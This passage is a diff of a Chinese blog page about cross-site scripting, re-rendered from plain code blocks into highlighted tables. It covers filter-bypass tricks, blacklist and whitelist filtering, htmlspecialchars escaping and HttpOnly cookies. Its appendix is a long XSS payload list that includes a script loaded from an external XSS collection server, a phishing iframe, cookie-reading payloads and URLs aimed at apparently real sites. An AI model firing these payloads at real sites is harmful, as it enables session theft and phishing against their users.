+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript">大小写混淆:<br>&lt;img src=JaVaScRiPt:alert(‘xss’)&gt;<br>插入[tab]键；<br>&lt;img src=”jav alert(‘xss’);”&gt;<br>插入回车符:<br>&lt;img src=”jav<br>asrci<br>alert(‘xss’);”&gt;<br>使用/**/注释符:<br>&lt;img src=”java/*xxx*/script:alert(‘xss’);”&gt;<br>重复混淆关键字:<br>&lt;img src=”java/*/*javascript*/script/*javascript*/*/script:alert(‘xss<br>使用&amp;#十六进制编码字符:<br>&lt;img src=”jav&amp;#x09;ascript:alert(‘xss’);”&gt;<br>使用&amp;#十进制编码字符:<br>&lt;img src= jav&amp;#97;script:alert(‘xss’);”&gt;<br>使用&amp;#十进制编码字符(加入大量的0000):<br>&lt;img src=”j&amp;#00097;vascript:alert(‘xss’);”&gt;<br>在开头插入空格：<br>&lt;img src=” alert(‘xss’);”&gt;<br>ascript:<br>pt:<br>javascript:<br></code></pre></td></tr></table></figure>
+
 <p><strong>黑名单</strong>：<br>        过滤可能造成危害的符号及标签，发现使用者输入参数的值为<code>&lt; script&gt;xxx&lt; /script&gt;</code>就将其取代为空白。其优点是可以允许开发某些特殊HTML标签，确实是可能因过滤不干净而使攻击者绕过规则。<br><strong>白名单</strong>：<br>        白名单仅允许执行特定格式的语法，仅允许<code>&lt; img scr=“http://xxx” &gt;</code> 格式，其余格式一律取代为空白。其优点是可允许特定输入格式的HTML标签，确实是验证程序编写难度校高，且用户可输入变化减少。</p>
 <h2 id="代码实体转义"><a href="#代码实体转义" class="headerlink" title="代码实体转义"></a>代码实体转义</h2><p>​        由于只保留文字部分是一劳永逸的，有时我们还需要展示这个标签，比如说程序论坛当中要贴一个代码，这个时候我们需要用一些转义，它会把这个大括号、小括号以及双引号做一个转义，做为一个字符，就无法执行这个标签型，后面加一个参数，但有时候单引号也会造成XSS。  </p>
-<pre><code class="javascript">// 把HTML实体标签转为符号，ENT_QUOTES指单引号也需要转义
-$desc = htmlspecialchars($_GET[&#39;desc&#39;],ENT_QUOTES)</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 把HTML实体标签转为符号，ENT_QUOTES指单引号也需要转义</span><br>$desc = htmlspecialchars($_GET[<span class="hljs-string">'desc'</span>],ENT_QUOTES)<br></code></pre></td></tr></table></figure>
+
 <h2 id="httponly防止cookie被盗取"><a href="#httponly防止cookie被盗取" class="headerlink" title="httponly防止cookie被盗取"></a>httponly防止cookie被盗取</h2><p>​        一个信号当中有那么多的地方存在着这个输入以及检测的地方，可能就有一些地方漏掉，只要有一个地方漏掉了，用户的cookie信息就被盗取了。服务器在发送用户信息的时候，我们需要加上一个httponly，这个代码无法读取到cookie的信息，那么攻击者也是得不到这个信息，这对于用户来说也是非常好的保护。<br>​        比如说张三在我们网站上登陆了一下用户名，李四他特意发了一个攻击请求，他拿不到这个用户ID，就冒充不了这个张三。如果在Cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到Cookie信息，这样能有效的防止XSS攻击。<br>​        最重要的是：<font color="red">千万不要引入任何不可信的第三方JavaScript到页面里！  </font></p>
-<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="跨站语句大全"><a href="#跨站语句大全" class="headerlink" title="跨站语句大全"></a>跨站语句大全</h2><pre><code class="javascript">&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;   大小写绕过
-&#39;&quot;&gt;&lt;IFRAME SRC=javascript:alert(&#39;XSXSSSs&#39;)&gt;&lt;/IFRAME&gt;
-&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XXSSSS&quot;)&lt;/scr&lt;/script&gt;ipt&gt;  过滤script绕过
-&lt;img src=&quot;&quot;onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;   直接k掉script绕过
-&lt;script&gt;eval(string.fromcharcode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script&gt;  包含alert就绕过（括号一串数字是alert(xss)的ASCII值）
-&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;  构造js绕过
-&#39;;alert(&#39;xss&#39;);&#39;   htmlentities没有过滤单引号，直接用单引号绕过。
-..../example8.php/[/url]&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; &quot;&lt;   当post 地址使用了当前url的时候，可这样绕过
-..../example9.php#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;  通过构造一个带xss的锚点绕过
-&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;=&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;alert(1)&lt;/script&gt;   过chrome默认xss过滤器
-http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="跨站语句大全"><a href="#跨站语句大全" class="headerlink" title="跨站语句大全"></a>跨站语句大全</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs javascript">'"&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;   大小写绕过<br>'"&gt;&lt;IFRAME SRC=javascript:alert('XSXSSSs')&gt;&lt;/IFRAME&gt;<br>&lt;scr&lt;script&gt;ipt&gt;alert("XXSSSS")&lt;/scr&lt;/script&gt;ipt&gt;  过滤script绕过<br>&lt;img src=""onerror="alert('xss')"&gt;   直接k掉script绕过<br>&lt;script&gt;eval(string.fromcharcode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script&gt;  包含alert就绕过（括号一串数字是alert(xss)的ASCII值）<br>&lt;/script&gt;&lt;script&gt;alert('xss')&lt;/script&gt;  构造js绕过<br>';alert('xss');'   htmlentities没有过滤单引号，直接用单引号绕过。<br>..../example8.php/[/url]'&gt;&lt;script&gt;alert('xss')&lt;/script&gt; "&lt;   当post 地址使用了当前url的时候，可这样绕过<br>..../example9.php#&lt;script&gt;alert('xss')&lt;/script&gt;  通过构造一个带xss的锚点绕过<br>&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;=&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;alert(1)&lt;/script&gt;   过chrome默认xss过滤器<br>http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx<br><br><br>%22Onclick%3D(outerHTML%3DURL)|%26quot#&lt;img/src=# onerror=alert()&gt;<br>%27%29%0D%0Aalert%28document.cookie%29%2F%2F<br><br>&lt;script&gt;alert("跨站")&lt;/script&gt;    (最常用）<br>&lt;img scr=javascript:alert("跨站")&gt;&lt;/img&gt;<br><br>http://www.example.com/MyApp.aspx?myvar= "&gt;&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;<br><br>&lt;IFRAME SRC=javascript:alert('test')&gt;&lt;/IFRAME&gt;<br>" onclick="alert(1)"<br>&lt;img scr="javascrip&amp;#116&amp;#58 alert(/跨站/)&gt;&lt;/img&gt;<br>&lt;img scr="javas????cript:alert(/跨站/)" width=150&gt;&lt;/img&gt; (?用tab键弄出来的空格）<br>&lt;img scr="#" onerror=alert(/跨站/)&gt;&lt;/img&gt;<br>&lt;img scr="#" style="xss:expression(alert(/xss/));"&gt;&lt;/img&gt;<br>&lt;img scr="#"/* */onerror=alert(/xss/) width=150&gt;&lt;/img&gt; (/**/ 表示注释）<br>&lt;img src=vbscript:msgbox ("xss")&gt;&lt;/img&gt;<br>&lt;style&gt; input &#123;left:expression (alert('xss'))&#125;&lt;/style&gt;<br>&lt;div style=&#123;left:expression (alert('xss'))&#125;&gt;&lt;/div&gt;<br>&lt;div style=&#123;left:exp/* */ression (alert('xss'))&#125;&gt;&lt;/div&gt;<br>&lt;div style=&#123;left:\0065\0078ression (alert('xss'))&#125;&gt;&lt;/div&gt;<br>html 实体 &lt;div style=&#123;left:&amp;#ｘ0065；xpression (alert('xss'))&#125;&gt;&lt;/div&gt;<br>unicode &lt;div style="&#123;left:expRessioN (alert('xss'))&#125;"&gt;<br><br>"]&#125;%3Cscript%3Ealert('By b14ckb0y')%3C/script%3E&#123;[&amp;item="]&lt;iframe%20src=http://new.qzone.qq.com/9530772%20width=400%20height=600&gt;&lt;/iframe&gt;["<br><br><br>/peixun/Search.asp?Field=&amp;Keyword=&amp;ClassID=0&amp;page=2<br>/peixun/Search.asp?Field='/&gt;&lt;script&gt;alert(451)&lt;/script&gt;&amp;Keyword=&amp;ClassID=0&amp;page=2<br><br>Referer: '"&gt;&lt;/a&gt;&lt;script&gt;alert(312)&lt;/script&gt;  传送头插入<br><br>/peixun/Search.asp?Field=%27%22%3E%3Ciframe+id%3D445+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E<br><br>/peixun/Search.asp?Field='"&gt;&lt;iframe id=445 src=http://demo.testfire.net/phishing.html&gt;<br><br>&lt;script src="http://192.168.1.55:8080/xssing-master/?u=f389c3" &gt; &lt;/script&gt; <br>&lt;script&gt;document.location=('http://www.baidu.com')&lt;/script&gt; <br>&lt;script&gt;document.write('&lt;iframe src=http://www.baidu.com  width=0 height=0&gt;&lt;/iframe&gt;');&lt;/script&gt; <br><br>/user/User_Message.asp?Action=Manage&amp;ManageType=Inbox&amp;Field=Content%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%38%34%38%33%29%3c%2f%73%43%72%49%70%54%3e <br><br><br>&lt;input id="Submit" type="submit" value="保存修改结果" onclick="alert(1)"/&gt; &lt; name="Submit"&gt;<br><br>http://www.xx.com/netsearch_pre.jsp?netname=1" onmouseenter="prompt(/csits/)<br><br>url=%0aX-XSS-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt;<br><br>http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E<br></code></pre></td></tr></table></figure>
 
-
-%22Onclick%3D(outerHTML%3DURL)|%26quot#&lt;img/src=# onerror=alert()&gt;
-%27%29%0D%0Aalert%28document.cookie%29%2F%2F
-
-&lt;script&gt;alert(&quot;跨站&quot;)&lt;/script&gt;    (最常用）
-&lt;img scr=javascript:alert(&quot;跨站&quot;)&gt;&lt;/img&gt;
-
-http://www.example.com/MyApp.aspx?myvar= &quot;&gt;&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert(&#39;XSS&#39;))&gt;
-
-&lt;IFRAME SRC=javascript:alert(&#39;test&#39;)&gt;&lt;/IFRAME&gt;
-&quot; onclick=&quot;alert(1)&quot;
-&lt;img scr=&quot;javascrip&amp;#116&amp;#58 alert(/跨站/)&gt;&lt;/img&gt;
-&lt;img scr=&quot;javas????cript:alert(/跨站/)&quot; width=150&gt;&lt;/img&gt; (?用tab键弄出来的空格）
-&lt;img scr=&quot;#&quot; onerror=alert(/跨站/)&gt;&lt;/img&gt;
-&lt;img scr=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;&lt;/img&gt;
-&lt;img scr=&quot;#&quot;/* */onerror=alert(/xss/) width=150&gt;&lt;/img&gt; (/**/ 表示注释）
-&lt;img src=vbscript:msgbox (&quot;xss&quot;)&gt;&lt;/img&gt;
-&lt;style&gt; input {left:expression (alert(&#39;xss&#39;))}&lt;/style&gt;
-&lt;div style={left:expression (alert(&#39;xss&#39;))}&gt;&lt;/div&gt;
-&lt;div style={left:exp/* */ression (alert(&#39;xss&#39;))}&gt;&lt;/div&gt;
-&lt;div style={left:\0065\0078ression (alert(&#39;xss&#39;))}&gt;&lt;/div&gt;
-html 实体 &lt;div style={left:&amp;#ｘ0065；xpression (alert(&#39;xss&#39;))}&gt;&lt;/div&gt;
-unicode &lt;div style=&quot;{left:expRessioN (alert(&#39;xss&#39;))}&quot;&gt;
-
-&quot;]}%3Cscript%3Ealert(&#39;By b14ckb0y&#39;)%3C/script%3E{[&amp;item=&quot;]&lt;iframe%20src=http://new.qzone.qq.com/9530772%20width=400%20height=600&gt;&lt;/iframe&gt;[&quot;
-
-
-/peixun/Search.asp?Field=&amp;Keyword=&amp;ClassID=0&amp;page=2
-/peixun/Search.asp?Field=&#39;/&gt;&lt;script&gt;alert(451)&lt;/script&gt;&amp;Keyword=&amp;ClassID=0&amp;page=2
-
-Referer: &#39;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(312)&lt;/script&gt;  传送头插入
-
-/peixun/Search.asp?Field=%27%22%3E%3Ciframe+id%3D445+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E
-
-/peixun/Search.asp?Field=&#39;&quot;&gt;&lt;iframe id=445 src=http://demo.testfire.net/phishing.html&gt;
-
-&lt;script src=&quot;http://192.168.1.55:8080/xssing-master/?u=f389c3&quot; &gt; &lt;/script&gt; 
-&lt;script&gt;document.location=(&#39;http://www.baidu.com&#39;)&lt;/script&gt; 
-&lt;script&gt;document.write(&#39;&lt;iframe src=http://www.baidu.com  width=0 height=0&gt;&lt;/iframe&gt;&#39;);&lt;/script&gt; 
-
-/user/User_Message.asp?Action=Manage&amp;ManageType=Inbox&amp;Field=Content%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%38%34%38%33%29%3c%2f%73%43%72%49%70%54%3e 
-
-
-&lt;input id=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;保存修改结果&quot; onclick=&quot;alert(1)&quot;/&gt; &lt; name=&quot;Submit&quot;&gt;
-
-http://www.xx.com/netsearch_pre.jsp?netname=1&quot; onmouseenter=&quot;prompt(/csits/)
-
-url=%0aX-XSS-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt;
-
-http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E</code></pre>
 
             </div>
             <hr/>
@@ -1748,7 +1579,7 @@ http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20o
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">207.6k</span>&nbsp;字
+                class="white-color">203.2k</span>&nbsp;字
             
             
             
